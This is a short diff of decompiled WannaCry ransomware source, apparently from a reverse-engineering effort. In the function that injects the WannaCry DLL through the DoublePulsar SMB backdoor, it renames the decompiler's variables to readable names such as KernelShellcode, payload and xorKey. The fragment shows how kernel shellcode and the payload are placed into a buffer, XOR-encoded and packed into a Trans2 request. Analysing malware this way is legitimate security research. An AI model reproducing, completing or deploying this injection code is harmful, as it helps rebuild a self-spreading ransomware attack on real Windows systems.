@@ -66,22 +66,20 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, uns
 	}
 	if ( architectureType )
 	    {
-	      v7 = &unk_42E758;
-	      dword_42ECE9 = (int)(v5 + 3440);
-	      *(int *)((char *)&dword_42E750 + v4) = (int)v5;
-	      *(int *)((char *)&dword_42E754 + v4) = 1;
-	      v8 = v4;
+	      KernelShellcode = &unk_42E758;
+	      dword_42ECE9 = (int)(payload + 3440);
+	      *(int *)((char *)&dword_42E750 + sizeOfshellcode) = (int)payload;
+	      *(int *)((char *)&dword_42E754 + sizeOfshellcode) = 1;
 	    }
 	    else
 	    {
-	      v7 = &unk_42FA60;
-	      dword_4302CE = (int)(v5 + 3978);
-	      *(int *)((char *)&dword_42FA58 + v4) = (int)v5;
-	      *(int *)((char *)&dword_42FA5C + v4) = 1;
-	      v8 = v4;
+	      KernelShellcode = &unk_42FA60;
+	      dword_4302CE = (int)(payload + 3978);
+	      *(int *)((char *)&dword_42FA58 + sizeOfshellcode) = (int)payload;
+	      *(int *)((char *)&dword_42FA5C + sizeOfshellcode) = 1;
 	    }
-	    qmemcpy(v6, v7, v8);
-	    encodePacket(a3, (int)v6, v19);
+	    qmemcpy(hMem, KernelShellcode, sizeOfshellcode);
+	    encodePacket(xorKey, hMem, TotalSizeOfPayload);
 	    int iterations = TotalSizeOfPayload / 4096;
 	    int remainder = TotalSizeOfPayload % 4096;
 	    qmemcpy(&buf, &wannacry_Trans2_Request, 70);
